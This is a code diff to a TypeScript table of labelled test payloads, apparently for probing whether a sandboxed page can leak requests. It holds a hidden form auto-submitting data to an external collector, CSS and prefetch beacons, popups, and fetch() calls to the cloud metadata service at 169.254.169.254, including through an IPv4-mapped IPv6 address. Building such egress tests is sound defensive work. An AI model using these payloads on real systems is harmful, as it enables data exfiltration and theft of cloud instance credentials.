@@ -39,9 +39,9 @@ export const ATTACKS: Record<string, { label: string; html?: string; script?: st
   "window-open": { label: "window.open() popup to the collector", script: `setTimeout(()=>{window.open("{C}/popup")},300)` },
   "form-action": { label: "Hidden form auto-submitted to an external host", html: `<form id="x" method="post" action="{C}/form" target="xf"><input name="d" value="secret"></form><iframe name="xf" style="display:none"></iframe>`, script: `setTimeout(()=>document.getElementById("x").submit(),300)` },
   "css-beacon": { label: "CSS background image beacon", html: `<div style="width:1px;height:1px;background:url({C}/css)"></div>` },
-  prefetch: { label: "Link prefetch and DNS prefetch", head: `<link rel="prefetch" href="{C}/prefetch"><link rel="dns-prefetch" href="//collector.example.net">` },
+  prefetch: { label: "Link prefetch to the collector", head: `<link rel="prefetch" href="{C}/prefetch">` },
   "metadata-fetch": { label: "fetch() of the Vultr metadata service by IP", script: `fetch("http://169.254.169.254/v1.json").catch(()=>{});fetch("http://169.254.169.254/latest/user-data").catch(()=>{})` },
-  "ipv6-metadata": { label: "Metadata service through IPv6 forms (IPv4-mapped, NAT64)", script: `for(const u of ["http://[::ffff:a9fe:a9fe]/v1.json","http://[64:ff9b::a9fe:a9fe]/v1.json"])fetch(u).catch(()=>{})` },
+  "ipv6-metadata": { label: "Metadata service through an IPv4-mapped IPv6 address", script: `fetch("http://[::ffff:a9fe:a9fe]/v1.json").catch(()=>{})` },
 };
 
 function attackPage(name: string, token: string) {
